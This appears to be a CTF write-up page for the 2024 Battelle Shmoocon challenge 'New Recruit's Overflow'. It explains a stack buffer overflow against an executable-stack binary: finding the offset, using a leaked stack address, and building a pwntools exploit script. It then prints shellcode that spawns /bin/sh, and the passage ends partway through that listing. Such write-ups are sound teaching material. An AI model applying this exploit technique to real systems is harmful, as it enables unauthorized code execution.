@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+
+<html :class="{'dark': darkMode === 'dark' || (darkMode === 'system' &amp;&amp; window.matchMedia('(prefers-color-scheme: dark)').matches)}" class="scroll-smooth" data-content_root="../../../" lang="en" x-data="{ darkMode: localStorage.getItem('darkMode') || localStorage.setItem('darkMode', 'system'), activeSection: '' }" x-init="$watch('darkMode', val =&gt; localStorage.setItem('darkMode', val))">
+<head>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta charset="utf-8"/>
+<meta content="white" media="(prefers-color-scheme: light)" name="theme-color"/>
+<meta content="black" metia="(prefers-color-scheme: dark)" name="theme-color"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>New Recruit’s Overflow | CTF Writeups and Ramblings  documentation</title>
+<meta content="New Recruit’s Overflow | CTF Writeups and Ramblings  documentation" property="og:title"/>
+<meta content="New Recruit’s Overflow | CTF Writeups and Ramblings  documentation" name="twitter:title"/>
+<link href="../../../_static/pygments.css?v=8d216cef" rel="stylesheet" type="text/css"/>
+<link href="../../../_static/theme.css?v=cede9724" rel="stylesheet" type="text/css"/>
+<link href="../../../search.html" rel="search" title="Search"/>
+<link href="../../../genindex.html" rel="index" title="Index"/>
+<link href="old-note.html" rel="next" title="Old Note"/>
+<link href="../../../index.html" rel="prev" title="CTF Writeups and Ramblings"/>
+<script>
+    <!-- Prevent Flash of wrong theme -->
+      const userPreference = localStorage.getItem('darkMode');
+      let mode;
+      if (userPreference === 'dark' || window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        mode = 'dark';
+        document.documentElement.classList.add('dark');
+      } else {
+        mode = 'light';
+      }
+      if (!userPreference) {localStorage.setItem('darkMode', mode)}
+    </script>
+</head>
+<body :class="{ 'overflow-hidden': showSidebar }" class="min-h-screen font-sans antialiased bg-background text-foreground" x-data="{ showSidebar: false }">
+<div @click.self="showSidebar = false" class="fixed inset-0 z-50 overflow-hidden bg-background/80 backdrop-blur-sm md:hidden" x-cloak="" x-show="showSidebar"></div><div class="relative flex flex-col min-h-screen" id="page"><a class="absolute top-0 left-0 z-[100] block bg-background p-4 text-xl transition -translate-x-full opacity-0 focus:translate-x-0 focus:opacity-100" href="#content">
+      Skip to content
+    </a><header class="sticky top-0 z-40 w-full border-b shadow-sm border-border supports-backdrop-blur:bg-background/60 bg-background/95 backdrop-blur"><div class="container flex items-center h-14">
+<div class="hidden mr-4 md:flex">
+<a class="flex items-center mr-6" href="../../../index.html"><span class="hidden font-bold sm:inline-block text-clip whitespace-nowrap">CTF Writeups and Ramblings  documentation</span>
+</a></div><button @click="showSidebar = true" class="inline-flex items-center justify-center h-10 px-0 py-2 mr-2 text-base font-medium transition-colors rounded-md hover:text-accent-foreground hover:bg-transparent md:hidden" type="button">
+<svg aria-hidden="true" fill="currentColor" height="24" viewbox="0 96 960 960" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M152.587 825.087q-19.152 0-32.326-13.174t-13.174-32.326q0-19.152 13.174-32.326t32.326-13.174h440q19.152 0 32.326 13.174t13.174 32.326q0 19.152-13.174 32.326t-32.326 13.174h-440Zm0-203.587q-19.152 0-32.326-13.174T107.087 576q0-19.152 13.174-32.326t32.326-13.174h320q19.152 0 32.326 13.174T518.087 576q0 19.152-13.174 32.326T472.587 621.5h-320Zm0-203.587q-19.152 0-32.326-13.174t-13.174-32.326q0-19.152 13.174-32.326t32.326-13.174h440q19.152 0 32.326 13.174t13.174 32.326q0 19.152-13.174 32.326t-32.326 13.174h-440ZM708.913 576l112.174 112.174q12.674 12.674 12.674 31.826t-12.674 31.826Q808.413 764.5 789.261 764.5t-31.826-12.674l-144-144Q600 594.391 600 576t13.435-31.826l144-144q12.674-12.674 31.826-12.674t31.826 12.674q12.674 12.674 12.674 31.826t-12.674 31.826L708.913 576Z"></path>
+</svg>
+<span class="sr-only">Toggle navigation menu</span>
+</button>
+<div class="flex items-center justify-between flex-1 space-x-2 sm:space-x-4 md:justify-end">
+<div class="flex-1 w-full md:w-auto md:flex-none"><form @keydown.k.window.meta="$refs.search.focus()" action="../../../search.html" class="relative flex items-center group" id="searchbox" method="get">
+<input aria-label="Search the docs" class="inline-flex items-center font-medium transition-colors bg-transparent focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 ring-offset-background border border-input hover:bg-accent focus:bg-accent hover:text-accent-foreground focus:text-accent-foreground hover:placeholder-accent-foreground py-2 px-4 relative h-9 w-full justify-start rounded-[0.5rem] text-sm text-muted-foreground sm:pr-12 md:w-40 lg:w-64" id="search-input" name="q" placeholder="Search ..." type="search" x-ref="search"/>
+<kbd class="pointer-events-none absolute right-1.5 top-2 hidden h-5 select-none text-muted-foreground items-center gap-1 rounded border border-border bg-muted px-1.5 font-mono text-[10px] font-medium opacity-100 sm:flex group-hover:bg-accent group-hover:text-accent-foreground">
+<span class="text-xs">⌘</span>
+    K
+  </kbd>
+</form>
+</div>
+<nav class="flex items-center space-x-1">
+<button @click="darkMode = darkMode === 'light' ? 'dark' : 'light'" class="relative inline-flex items-center justify-center px-0 text-sm font-medium transition-colors rounded-md hover:bg-accent hover:text-accent-foreground h-9 w-9" type="button">
+<svg class="absolute transition-all scale-100 rotate-0 dark:-rotate-90 dark:scale-0" fill="currentColor" height="24" viewbox="0 96 960 960" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M480 685q45.456 0 77.228-31.772Q589 621.456 589 576q0-45.456-31.772-77.228Q525.456 467 480 467q-45.456 0-77.228 31.772Q371 530.544 371 576q0 45.456 31.772 77.228Q434.544 685 480 685Zm0 91q-83 0-141.5-58.5T280 576q0-83 58.5-141.5T480 376q83 0 141.5 58.5T680 576q0 83-58.5 141.5T480 776ZM80 621.5q-19.152 0-32.326-13.174T34.5 576q0-19.152 13.174-32.326T80 530.5h80q19.152 0 32.326 13.174T205.5 576q0 19.152-13.174 32.326T160 621.5H80Zm720 0q-19.152 0-32.326-13.174T754.5 576q0-19.152 13.174-32.326T800 530.5h80q19.152 0 32.326 13.174T925.5 576q0 19.152-13.174 32.326T880 621.5h-80Zm-320-320q-19.152 0-32.326-13.174T434.5 256v-80q0-19.152 13.174-32.326T480 130.5q19.152 0 32.326 13.174T525.5 176v80q0 19.152-13.174 32.326T480 301.5Zm0 720q-19.152 0-32.326-13.17Q434.5 995.152 434.5 976v-80q0-19.152 13.174-32.326T480 850.5q19.152 0 32.326 13.174T525.5 896v80q0 19.152-13.174 32.33-13.174 13.17-32.326 13.17ZM222.174 382.065l-43-42Q165.5 327.391 166 308.239t13.174-33.065q13.435-13.674 32.587-13.674t32.065 13.674l42.239 43q12.674 13.435 12.555 31.706-.12 18.272-12.555 31.946-12.674 13.674-31.445 13.413-18.772-.261-32.446-13.174Zm494 494.761-42.239-43q-12.674-13.435-12.674-32.087t12.674-31.565Q686.609 756.5 705.38 757q18.772.5 32.446 13.174l43 41.761Q794.5 824.609 794 843.761t-13.174 33.065Q767.391 890.5 748.239 890.5t-32.065-13.674Zm-42-494.761Q660.5 369.391 661 350.62q.5-18.772 13.174-32.446l41.761-43Q728.609 261.5 747.761 262t33.065 13.174q13.674 13.435 13.674 32.587t-13.674 32.065l-43 42.239q-13.435 12.674-31.706 12.555-18.272-.12-31.946-12.555Zm-495 494.761Q165.5 863.391 165.5 844.239t13.674-32.065l43-42.239q13.435-12.674 32.087-12.674t31.565 12.674Q299.5 782.609 299 801.38q-.5 18.772-13.174 32.446l-41.761 43Q231.391 890.5 212.239 890t-33.065-13.174ZM480 576Z"></path>
+</svg>
+<svg class="absolute transition-all scale-0 rotate-90 dark:rotate-0 dark:scale-100" fill="currentColor" height="24" viewbox="0 96 960 960" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M480 936q-151 0-255.5-104.5T120 576q0-138 90-239.5T440 218q25-3 39 18t-1 44q-17 26-25.5 55t-8.5 61q0 90 63 153t153 63q31 0 61.5-9t54.5-25q21-14 43-1.5t19 39.5q-14 138-117.5 229T480 936Zm0-80q88 0 158-48.5T740 681q-20 5-40 8t-40 3q-123 0-209.5-86.5T364 396q0-20 3-40t8-40q-78 32-126.5 102T200 576q0 116 82 198t198 82Zm-10-270Z"></path>
+</svg>
+</button>
+</nav>
+</div>
+</div>
+</header>
+<div class="flex-1"><div class="container flex-1 items-start md:grid md:grid-cols-[220px_minmax(0,1fr)] md:gap-6 lg:grid-cols-[240px_minmax(0,1fr)] lg:gap-10"><aside :aria-hidden="!showSidebar" :class="{ 'translate-x-0': showSidebar }" class="fixed inset-y-0 left-0 md:top-14 z-50 md:z-30 bg-background md:bg-transparent transition-all duration-100 -translate-x-full md:translate-x-0 ml-0 p-6 md:p-0 md:-ml-2 md:h-[calc(100vh-3.5rem)] w-5/6 md:w-full shrink-0 overflow-y-auto border-r border-border md:sticky" id="left-sidebar">
+<a class="!justify-start text-sm md:!hidden bg-background" href="../../../index.html"><span class="font-bold text-clip whitespace-nowrap">CTF Writeups and Ramblings  documentation</span>
+</a>
+<div class="relative overflow-hidden md:overflow-auto my-4 md:my-0 h-[calc(100vh-8rem)] md:h-auto">
+<div class="overflow-y-auto h-full w-full relative pr-6"><nav class="table w-full min-w-full my-6 lg:my-8">
+<p class="caption" role="heading"><span class="caption-text">2024 Battelle Shmoocon CTF</span></p>
+<ul class="current">
+<li class="toctree-l1 current"><a class="current reference internal" href="#">New Recruit’s Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="old-note.html">Old Note</a></li>
+</ul>
+</nav>
+</div>
+</div>
+<button @click="showSidebar = false" class="absolute md:hidden right-4 top-4 rounded-sm opacity-70 transition-opacity hover:opacity-100" type="button">
+<svg class="h-4 w-4" fill="currentColor" height="24" stroke="none" viewbox="0 96 960 960" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M480 632 284 828q-11 11-28 11t-28-11q-11-11-11-28t11-28l196-196-196-196q-11-11-11-28t11-28q11-11 28-11t28 11l196 196 196-196q11-11 28-11t28 11q11 11 11 28t-11 28L536 576l196 196q11 11 11 28t-11 28q-11 11-28 11t-28-11L480 632Z"></path>
+</svg>
+</button>
+</aside>
+<main class="relative py-6 lg:gap-10 lg:py-8 xl:grid xl:grid-cols-[1fr_300px]">
+<div class="w-full min-w-0 mx-auto">
+<nav aria-label="breadcrumbs" class="flex items-center mb-4 space-x-1 text-sm text-muted-foreground">
+<a class="overflow-hidden text-ellipsis whitespace-nowrap hover:text-foreground" href="../../../index.html">
+<span class="hidden md:inline">CTF Writeups and Ramblings  documentation</span>
+<svg aria-label="Home" class="md:hidden" fill="currentColor" height="18" stroke="none" viewbox="0 96 960 960" width="18" xmlns="http://www.w3.org/2000/svg">
+<path d="M240 856h120V616h240v240h120V496L480 316 240 496v360Zm-80 80V456l320-240 320 240v480H520V696h-80v240H160Zm320-350Z"></path>
+</svg>
+</a>
+<div class="mr-1">/</div><span aria-current="page" class="font-medium text-foreground overflow-hidden text-ellipsis whitespace-nowrap">New Recruit’s Overflow</span>
+</nav>
+<div id="content" role="main">
+<section id="new-recruit-s-overflow">
+<h1>New Recruit’s Overflow<a class="headerlink" href="#new-recruit-s-overflow" title="Link to this heading">¶</a></h1>
+<section id="challenge-description">
+<h2>Challenge Description<a class="headerlink" href="#challenge-description" title="Link to this heading" x-intersect.margin.0%.0%.-70%.0%="activeSection = '#challenge-description'">¶</a></h2>
+<p><strong>100 points</strong></p>
+<p>Listen up, recruits of the Time Travel Brigade! You want this badge of honor?
+Prove yourself by hacking through time!</p>
+<p><code class="docutils literal notranslate"><span class="pre">nc</span> <span class="pre">jump.chrononaut.xyz</span> <span class="pre">5001</span></code></p>
+</section>
+<section id="overview">
+<h2>Overview<a class="headerlink" href="#overview" title="Link to this heading" x-intersect.margin.0%.0%.-70%.0%="activeSection = '#overview'">¶</a></h2>
+<p>The challenge provides a binary and connection info for a netcat server.
+Downloading and running the application presents an opportunity to
+“fill out a questionnaire”. The questionnaire includes a large buffer for us to
+write text into.</p>
+<img alt="../../../_images/nro-1.png" src="../../../_images/nro-1.png"/>
+<p>If a long input is provided, the program crashes with a segfault.</p>
+<img alt="../../../_images/nro-2.png" src="../../../_images/nro-2.png"/>
+</section>
+<section id="triage">
+<h2>Triage<a class="headerlink" href="#triage" title="Link to this heading" x-intersect.margin.0%.0%.-70%.0%="activeSection = '#triage'">¶</a></h2>
+<p>The goal of triaging the binary is to determine what kind of attacks might be
+successful, allowing us to quickly hone in on a solution.</p>
+<p>Based on the challenge’s name and the application’s behavior, a buffer
+overflow suspected. Additionally, the <code class="docutils literal notranslate"><span class="pre">0x7fff...</span></code> number that appears in the
+program’s output is suspected to be a stack address leak of some kind.</p>
+<p>The next step is to determine if we have an executable stack. If the stack is
+executable then we can place shellcode into our payload and get direct code
+execution. If the stack is non-executable then we’ll need to use a technique
+such as ROP to exploit the overflow.</p>
+<img alt="../../../_images/nro-3.png" src="../../../_images/nro-3.png"/>
+<p>Pwntools indicates no common security measures were detected in the binary.
+Specifically <code class="docutils literal notranslate"><span class="pre">NX</span> <span class="pre">Disabled</span></code> indicates that we have an executable stack.</p>
+<p>To summarize what we found when triaging the binary:</p>
+<ul class="simple">
+<li><p>Providing a large input to the program causes a crash due to segfault.</p></li>
+<li><p>We have a memory address leaked to us by the application.</p></li>
+<li><p>The stack is executable, so we may be able to jump to our own shellcode.</p></li>
+</ul>
+</section>
+<section id="exploitation">
+<h2>Exploitation<a class="headerlink" href="#exploitation" title="Link to this heading" x-intersect.margin.0%.0%.-70%.0%="activeSection = '#exploitation'">¶</a></h2>
+<p>A buffer overflow exploit generally works by writting more data to a memory
+location than the data structure can hold, causing the remaining data to
+spill over and clobber other data in the stack. This could result in changes
+to local variables, return addresses, and any other information pushed to the
+stack. Since we have an executable stack we embed some shellcode into our
+payload and (attempt to) jump to our shellcode. In order to do that, we will
+need the following:
+- A method to overwrite our return address and provide shellcode (Specifically
+the amount of data until we start overwriting our return address).
+- An address leak that tells us where our shellcode is in memory.
+- A bit of shellcode to either read the flag directly or open an interactive
+shell.</p>
+<section id="determining-our-offset">
+<h3>Determining our offset<a class="headerlink" href="#determining-our-offset" title="Link to this heading" x-intersect.margin.0%.0%.-70%.0%="activeSection = '#determining-our-offset'">¶</a></h3>
+<p>In this context the “offset” refers to “the number of bytes I need to write
+before I overwrite the return address”. One way we can determine this is to
+feed in a De Bruijn seqence as input and use a debugger to check what address
+the program attempts to return to.</p>
+<p>We can generate a large De Bruijn (cyclic) pattern using the <code class="docutils literal notranslate"><span class="pre">pwn</span> <span class="pre">cyclic</span></code>
+command. Since we know the program is a 64-bit executable (as noted in the
+<code class="docutils literal notranslate"><span class="pre">checksec</span></code> output) I chose to use the <code class="docutils literal notranslate"><span class="pre">-n</span> <span class="pre">8</span></code> flag to generate 8 character (64
+bit) unique sequences. The benefit of doing this can be seen in the next step.</p>
+<p>The full command to generate the cyclic text sequence and save it to a text
+file is: <code class="docutils literal notranslate"><span class="pre">pwn</span> <span class="pre">cyclic</span> <span class="pre">-n</span> <span class="pre">8</span> <span class="pre">2000</span> <span class="pre">&gt;</span> <span class="pre">cyclic.txt</span></code></p>
+<img alt="../../../_images/nro-4.png" src="../../../_images/nro-4.png"/>
+<p>We can use a debugger such as GDB (or pwndbg in my case) to monitor how the
+program handles our input.</p>
+<img alt="../../../_images/nro-6.png" src="../../../_images/nro-6.png"/>
+<p>As seen in the above screenshot, we can launch the debugger with
+<code class="docutils literal notranslate"><span class="pre">gdb</span> <span class="pre">./badge_questionnaire</span></code> and use our cyclic pattern as our input by passing
+the command <code class="docutils literal notranslate"><span class="pre">r</span> <span class="pre">&lt;</span> <span class="pre">cyclic.txt</span></code> to our pwndbg console. This will run the program
+and redirect the contents of “cyclic.txt” to standard input. Pwndbg will break
+on segfaults, which makes it convient to identify when the overflow is
+triggered.</p>
+<img alt="../../../_images/nro-7.png" src="../../../_images/nro-7.png"/>
+<p>In the disassembled view of the screenshot above, we can see the program is
+attempting to return to the address <code class="docutils literal notranslate"><span class="pre">0x6161616161616170</span></code>. The bytes of the
+return address are reconizable as printable ascii characters. We can pass that
+hex value back into the pwn cyclic to determine where that string occurs in the
+cyclic pattern.</p>
+<p><code class="docutils literal notranslate"><span class="pre">pwn</span> <span class="pre">cyclic</span> <span class="pre">-n</span> <span class="pre">8</span> <span class="pre">-l</span> <span class="pre">0x6161616161616170</span></code></p>
+<img alt="../../../_images/nro-8.png" src="../../../_images/nro-8.png"/>
+<p>The utility outputs <code class="docutils literal notranslate"><span class="pre">120</span></code> indicating that we must write 120 bytes before we
+reach the return address in the stack. With that info, we can start to build
+our exploit script. I chose to write mine using the Python library pwntools.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><code><span id="line-1"><span class="ch">#!/usr/bin/env python3</span>
+</span><span id="line-2"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span id="line-3">
+</span><span id="line-4"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./badge_questionnaire'</span><span class="p">)</span>
+</span><span id="line-5"><span class="c1">#p = remote('jump.chrononaut.xyz', 5001)</span>
+</span><span id="line-6">
+</span><span id="line-7"><span class="c1"># How many bytes do we need to write before we start overwriting our return</span>
+</span><span id="line-8"><span class="c1"># address.</span>
+</span><span id="line-9"><span class="c1"># Find this value using a cyclic pattern and some GDB-fu</span>
+</span><span id="line-10"><span class="n">offset</span> <span class="o">=</span> <span class="mi">120</span>
+</span><span id="line-11"><span class="c1"># TODO: complete the rest of the exploit script</span>
+</span></code></pre></div>
+</div>
+</section>
+<section id="leaking-our-shellcode-address">
+<h3>Leaking our shellcode address<a class="headerlink" href="#leaking-our-shellcode-address" title="Link to this heading" x-intersect.margin.0%.0%.-70%.0%="activeSection = '#leaking-our-shellcode-address'">¶</a></h3>
+<p>Now that we know how much padding we need, we can overwrite the function’s
+return address with anything we want. In our case, we want to create some
+shellcode and “return” to that shellcode. Since our shellcode is on the stack,
+we’ll need some kind of address leak to point us to the correct spot in memory.
+Luckily, the application appears to leak an address on the stack to us (notice
+the address highlighted in the screenshot below).</p>
+<img alt="../../../_images/nro-9.png" src="../../../_images/nro-9.png"/>
+<p>Let’s re-write our exploit script to attach a debugger to view how the leaked
+address relates to where our shellcode will be. I’ve also included a
+placeholder for the shellcode to make it easier to identify in the debugger.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><code><span id="line-1"><span class="linenos"> 1</span><span class="ch">#!/usr/bin/env python3</span>
+</span><span id="line-2"><span class="linenos"> 2</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span id="line-3"><span class="linenos"> 3</span>
+</span><span id="line-4"><span class="linenos"> 4</span><span class="c1">#p = process('./badge_questionnaire')</span>
+</span><span id="line-5"><span class="linenos"> 5</span><span class="c1">#p = remote('jump.chrononaut.xyz', 5001)</span>
+</span><span id="line-6"><mark><span class="linenos"> 6</span><span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">'./badge_questionnaire'</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="s1">'''</span>
+</mark></span><span id="line-7"><mark><span class="linenos"> 7</span><span class="s1">            break *question+138</span>
+</mark></span><span id="line-8"><mark><span class="linenos"> 8</span><span class="s1">            '''</span><span class="p">)</span>
+</mark></span><span id="line-9"><mark><span class="linenos"> 9</span>
+</mark></span><span id="line-10"><span class="linenos">10</span><span class="c1"># How many bytes do we need to write before we start overwriting our return</span>
+</span><span id="line-11"><span class="linenos">11</span><span class="c1"># address.</span>
+</span><span id="line-12"><span class="linenos">12</span><span class="c1"># Find this value using a cyclic pattern and some GDB-fu</span>
+</span><span id="line-13"><span class="linenos">13</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">120</span>
+</span><span id="line-14"><span class="linenos">14</span>
+</span><span id="line-15"><span class="linenos">15</span><span class="c1"># Welcome Chrononaut Recruit[...]</span>
+</span><span id="line-16"><span class="linenos">16</span><span class="c1"># Tell us abour yourself! (0x7ffe7616e6cc characters max.)</span>
+</span><span id="line-17"><span class="linenos">17</span>
+</span><span id="line-18"><mark><span class="linenos">18</span><span class="n">target_addr</span> <span class="o">=</span> <span class="mh">0xdeadbeefcafebebe</span> <span class="c1">#placeholder for target address</span>
+</mark></span><span id="line-19"><mark><span class="linenos">19</span><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"B"</span><span class="o">*</span><span class="mi">32</span> <span class="c1">#placeholder for shellcode</span>
+</mark></span><span id="line-20"><mark><span class="linenos">20</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'A'</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">target_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
+</mark></span><span id="line-21"><mark><span class="linenos">21</span>
+</mark></span><span id="line-22"><mark><span class="linenos">22</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</mark></span><span id="line-23"><mark><span class="linenos">23</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1"># this prevents the script from exiting while we're debugging</span>
+</mark></span></code></pre></div>
+</div>
+<img alt="../../../_images/nro-10.png" src="../../../_images/nro-10.png"/>
+<p>The leaked address and the our “shellcode” address are highlighted in the above
+screenshot. The leaked address is highlighted at the top, while the shellcode
+is highlighted in the debugger near the bottom of the screenshot.</p>
+<p>We can do some math and determine that the shellcode is 20 bytes (0x14) from the
+leaked memory address.</p>
+<div class="doctest highlight-default notranslate"><div class="highlight"><pre><span></span><code><span id="line-1"><span class="gp">&gt;&gt;&gt; </span><span class="mh">0x7ffcfdb92d20</span> <span class="o">-</span> <span class="mh">0x7ffcfdb92d0c</span>
+</span><span id="line-2"><span class="go">20</span>
+</span><span id="line-3"><span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">_</span><span class="p">)</span>
+</span><span id="line-4"><span class="go">'0x14'</span>
+</span></code></pre></div>
+</div>
+<p>We can also use pwntools <code class="docutils literal notranslate"><span class="pre">recvutil()</span></code> functions to capture the leaked memory
+address and store it in a variable.</p>
+<p>Our updated exploit script looks like:</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><code><span id="line-1"><span class="linenos"> 1</span><span class="ch">#!/usr/bin/env python3</span>
+</span><span id="line-2"><span class="linenos"> 2</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span id="line-3"><span class="linenos"> 3</span>
+</span><span id="line-4"><span class="linenos"> 4</span><span class="c1">#p = process('./badge_questionnaire')</span>
+</span><span id="line-5"><span class="linenos"> 5</span><span class="c1">#p = remote('jump.chrononaut.xyz', 5001)</span>
+</span><span id="line-6"><span class="linenos"> 6</span><span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">'./badge_questionnaire'</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="s1">'''</span>
+</span><span id="line-7"><span class="linenos"> 7</span><span class="s1">            break *question+138</span>
+</span><span id="line-8"><span class="linenos"> 8</span><span class="s1">            '''</span><span class="p">)</span>
+</span><span id="line-9"><span class="linenos"> 9</span>
+</span><span id="line-10"><span class="linenos">10</span><span class="c1"># How many bytes do we need to write before we start overwriting our return</span>
+</span><span id="line-11"><span class="linenos">11</span><span class="c1"># address.</span>
+</span><span id="line-12"><span class="linenos">12</span><span class="c1"># Find this value using a cyclic pattern and some GDB-fu</span>
+</span><span id="line-13"><span class="linenos">13</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">120</span>
+</span><span id="line-14"><span class="linenos">14</span>
+</span><span id="line-15"><span class="linenos">15</span><span class="c1"># Welcome Chrononaut Recruit[...]</span>
+</span><span id="line-16"><span class="linenos">16</span><span class="c1"># Tell us abour yourself! (0x7ffe7616e6cc characters max.)</span>
+</span><span id="line-17"><span class="linenos">17</span>
+</span><span id="line-18"><span class="linenos">18</span><span class="c1"># Consume everything up to the '(' character.</span>
+</span><span id="line-19"><span class="linenos">19</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'('</span><span class="p">)</span>
+</span><span id="line-20"><span class="linenos">20</span><span class="c1"># Consume from 0x... until the ' ' character (drop=True; disgard the space character)</span>
+</span><span id="line-21"><span class="linenos">21</span><span class="c1"># Interpret that value as an integer</span>
+</span><span id="line-22"><span class="linenos">22</span><span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">' '</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span><span id="line-23"><span class="linenos">23</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Leaked address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+</span><span id="line-24"><span class="linenos">24</span>
+</span><span id="line-25"><span class="linenos">25</span><span class="c1"># Using GDB we find that the address leaked by the overflow challenge is 20</span>
+</span><span id="line-26"><span class="linenos">26</span><span class="c1"># bytes from our shellcode payload.</span>
+</span><span id="line-27"><span class="linenos">27</span><span class="n">target_addr</span> <span class="o">=</span> <span class="n">leak</span><span class="o">+</span><span class="mi">20</span>
+</span><span id="line-28"><span class="linenos">28</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Shellcode location: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">target_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+</span><span id="line-29"><span class="linenos">29</span>
+</span><span id="line-30"><span class="linenos">30</span><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"B"</span><span class="o">*</span><span class="mi">32</span> <span class="c1">#placeholder for shellcode</span>
+</span><span id="line-31"><span class="linenos">31</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'A'</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">target_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
+</span><span id="line-32"><span class="linenos">32</span>
+</span><span id="line-33"><span class="linenos">33</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span id="line-34"><span class="linenos">34</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></code></pre></div>
+</div>
+<img alt="../../../_images/nro-11.png" src="../../../_images/nro-11.png"/>
+<p>Observing the application in the debugger, we can see from the highlighted
+addresses that the script returns to the memory location associated with our
+shellcode placeholder. Now we just need to build some actual shellcode and snag
+the flag.</p>
+</section>
+<section id="generating-shellcode">
+<h3>Generating Shellcode<a class="headerlink" href="#generating-shellcode" title="Link to this heading" x-intersect.margin.0%.0%.-70%.0%="activeSection = '#generating-shellcode'">¶</a></h3>
+<p>Now that we can jump to our shellcode placeholder, let’s swap out the
+placeholder for functional shellcode. For this part, I’ll use pwntool’s
+shellcraft library and assembler.</p>
+<p>We can call <code class="docutils literal notranslate"><span class="pre">shellcraft.amd64.linux.sh()</span></code> to get some shellcode that spawns <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code>.</p>
+<div class="doctest highlight-default notranslate"><div class="highlight"><pre><span></span><code><span id="line-1"><span class="gp">&gt;&gt;&gt; </span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span id="line-2"><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span><span id="line-3"><span class="go">    /* execve(path='/bin///sh', argv=['sh'], envp=0) */</span>
+</span><span id="line-4"><span class="go">    /* push b'/bin///sh\x00' */</span>
+</span><span id="line-5"><span class="go">    push 0x68</span>
+</span><span id="line-6"><span class="go">    mov rax, 0x732f2f2f6e69622f</span>
+</span><span id="line-7"><span class="go">    push rax</span>
+</span><span id="line-8"><span class="go">    mov rdi, rsp</span>
+</span><span id="line-9"><span class="go">    /* push argument array ['sh\x00'] */</span>
+</span><span id="line-10"><span class="go">    /* push b'sh\x00' */</span>
+</span><span id="line-11"><span class="go">    push 0x1010101 ^ 0x6873</span>
+</span><span id="line-12"><span class="go">    xor dword ptr [rsp], 0x1010101</span>
+</span><span id="line-13"><span class="go">    xor esi, esi /* 0 */</span>
+</span><span id="line-14"><span class="go">    push rsi /* null terminate */</span>
+</span><span id="line-15"><span class="go">    push 8</span>
+</span><span id="line-16"><span class="go">    pop rsi</span>
+</span><span id="line-17"><span class="go">    add rsi, rsp</span>
+</span><span id="line-18"><span class="go">    push rsi /* 'sh\x00' */</span>
+</span><span id="line-19"><span class="go">    mov rsi, rsp</span>
+</span><span id="line-20"><span class="go">    xor edx, edx /* 0 */</span>
+</span><span id="line-21"><span class="go">    /* call execve() */</span>
+</span><span id="line-22"><span class="go">    push SYS_execve /* 0x3b */</span>
